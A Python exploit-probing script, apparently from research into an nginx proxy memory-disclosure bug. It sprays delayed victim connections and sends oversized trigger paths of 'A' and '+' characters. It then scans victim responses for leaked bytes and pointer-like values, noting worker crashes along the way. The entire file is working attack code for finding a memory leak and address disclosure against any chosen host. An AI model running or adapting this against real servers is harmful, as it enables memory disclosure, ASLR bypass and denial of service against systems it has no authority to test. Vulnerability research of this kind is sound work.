#!/usr/bin/env python3
import argparse
import re
import socket
import sys
import time
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import nginx_rifter as rifter


EXPECTED_BODY = b"backend ok\n"


@dataclass
class VictimResult:
    index: int
    status: str
    body: bytes
    raw: bytes
    error: str = ""


def recv_all(sock, timeout):
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        except OSError as exc:
            return b"".join(chunks), str(exc)
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks), ""


def dechunk(body):
    out = bytearray()
    pos = 0
    while True:
        line_end = body.find(b"\r\n", pos)
        if line_end == -1:
            return body
        line = body[pos:line_end].split(b";", 1)[0].strip()
        try:
            size = int(line, 16)
        except ValueError:
            return body
        pos = line_end + 2
        if size == 0:
            return bytes(out)
        if pos + size > len(body):
            return body
        out.extend(body[pos : pos + size])
        pos += size
        if body[pos : pos + 2] != b"\r\n":
            return body
        pos += 2


def parse_response(raw):
    head, _sep, body = raw.partition(b"\r\n\r\n")
    status = head.split(b"\r\n", 1)[0].decode("latin-1", errors="replace") if head else "<no response>"
    headers = {}
    for line in head.split(b"\r\n")[1:]:
        if b":" not in line:
            continue
        key, value = line.split(b":", 1)
        headers[key.strip().lower()] = value.strip().lower()
    if headers.get(b"transfer-encoding") == b"chunked":
        body = dechunk(body)
    return status, body


def pointer_like_offsets(blob):
    hits = []
    for idx in range(0, max(0, len(blob) - 7)):
        value = int.from_bytes(blob[idx : idx + 8], "little")
        if 0x0000550000000000 <= value <= 0x00007fffffffffff:
            hits.append((idx, value))
            if len(hits) >= 8:
                break
    return hits


def byte_profile(blob):
    nonprint = sum(1 for b in blob if b not in b"\r\n\t" and (b < 0x20 or b > 0x7e))
    return f"len={len(blob)} nonprint={nonprint} ptr_like={len(pointer_like_offsets(blob))}"


def interesting(blob):
    if blob and blob != EXPECTED_BODY:
        return True
    if any(b not in b"\r\n\t" and (b < 0x20 or b > 0x7e) for b in blob):
        return True
    return bool(pointer_like_offsets(blob))


def open_victims(host, port, count, body_len, delay):
    sockets = []
    body = b"V" * body_len
    for _ in range(count):
        sock = socket.create_connection((host, port), timeout=5)
        req = (
            b"POST /spray HTTP/1.1\r\n"
            b"Host: active-probe\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"X-Delay: " + str(delay).encode() + b"\r\n"
            b"Connection: close\r\n"
            b"\r\n"
            + body
        )
        sock.sendall(req)
        sockets.append(sock)
        time.sleep(0.01)
    return sockets


def send_trigger(host, port, payload, trigger_delay):
    sock = socket.create_connection((host, port), timeout=5)
    req = (
        f"GET /api/{payload} HTTP/1.1\r\n"
        f"Host: active-probe\r\n"
        f"X-Delay: {trigger_delay}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("latin-1")
    sock.sendall(req)
    raw, err = recv_all(sock, timeout=max(1.0, trigger_delay + 1.0))
    try:
        sock.close()
    except OSError:
        pass
    return raw, err


def collect_victims(sockets, timeout):
    results = []
    for idx, sock in enumerate(sockets, start=1):
        raw, err = recv_all(sock, timeout)
        try:
            sock.close()
        except OSError:
            pass
        status, body = parse_response(raw)
        results.append(VictimResult(idx, status, body, raw, err))
    return results


def main():
    parser = argparse.ArgumentParser(
        description="Probe active non-LFI response over-read candidates with delayed proxy victims."
    )
    parser.add_argument("--target", default="127.0.0.1:19321")
    parser.add_argument("--port", type=int, default=19321)
    parser.add_argument("--a-count", type=int, default=127)
    parser.add_argument("--plus-counts", default="64,96,128,160,192,256,384,512,768,962")
    parser.add_argument("--suffixes", default="000000,AAAAAA,PPPPPP,ZZZZZZ,~~~~~~")
    parser.add_argument("--victims", type=int, default=8)
    parser.add_argument("--victim-body-len", type=int, default=4000)
    parser.add_argument("--victim-delay", type=float, default=1.5)
    parser.add_argument("--trigger-delay", type=float, default=0.05)
    parser.add_argument("--recv-timeout", type=float, default=4.0)
    args = parser.parse_args()

    host, port = rifter.parse_target(args.target, args.port)
    plus_counts = [int(item) for item in args.plus_counts.split(",") if item.strip()]
    suffixes = [item for item in args.suffixes.split(",") if item]
    interesting_hits = 0
    resets = 0
    clean = 0

    print(f"[*] target=http://{host}:{port}")
    print("[*] primitive=remote HTTP only; no LFI/phpinfo/procfs/core reads")
    print("[*] active candidate=delayed /spray proxy response over-read")

    for plus_count in plus_counts:
        for suffix in suffixes:
            payload = "A" * args.a_count + "+" * plus_count + suffix
            print(
                f"\n[+] plus_count={plus_count} suffix={suffix!r} "
                f"victims={args.victims}"
            )
            try:
                victims = open_victims(
                    host, port, args.victims, args.victim_body_len, args.victim_delay
                )
            except OSError as exc:
                print(f"    could not open victims: {exc}")
                resets += args.victims
                continue

            time.sleep(0.15)
            trigger_raw, trigger_err = send_trigger(host, port, payload, args.trigger_delay)
            trigger_status, trigger_body = parse_response(trigger_raw)
            print(f"    trigger status: {trigger_status} err={trigger_err or '-'}")
            print(f"    trigger body: {byte_profile(trigger_body)}")

            results = collect_victims(victims, args.recv_timeout)
            for result in results:
                profile = byte_profile(result.body)
                ok = result.body == EXPECTED_BODY
                if ok:
                    clean += 1
                elif result.raw:
                    interesting_hits += 1 if interesting(result.body) else 0
                else:
                    resets += 1
                verdict = "clean" if ok else ("reset" if not result.raw else "interesting")
                print(
                    f"    victim {result.index}: {verdict} "
                    f"status={result.status!r} {profile} err={result.error or '-'}"
                )
                if result.raw and not ok:
                    print(f"      body prefix: {result.body[:96]!r}")
                    for offset, value in pointer_like_offsets(result.body):
                        print(f"      pointer-like body bytes at +{offset}: {value:#x}")

    print(f"\n[*] summary: clean={clean} reset={resets} interesting={interesting_hits}")
    if interesting_hits:
        print("[!] active response corruption returned non-standard body bytes")
        return 1

    print("[+] no active response over-read observed in this sweep")
    if resets:
        print("[*] worker resets/crashes occurred, but victim responses did not leak memory")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
